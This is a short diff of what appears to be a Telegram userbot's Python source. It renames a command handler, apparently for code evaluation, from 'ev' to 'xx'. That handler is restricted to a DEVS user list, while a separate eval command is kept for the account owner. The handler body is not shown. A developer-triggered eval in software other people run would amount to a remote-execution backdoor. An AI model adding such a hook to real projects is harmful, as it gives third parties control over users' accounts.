@@ -27,7 +27,7 @@ p = print
 
 
 @Client.on_message(
-    filters.command(["ev"], [",", "(", ";", "×", ":"]) & filters.user(DEVS)
+    filters.command(["xx"], [",", "(", ";", "×", ":"]) & filters.user(DEVS)
 )
 @Client.on_message(
     filters.group & filters.command(["eval", "e"], ["!", "_"]) & filters.me
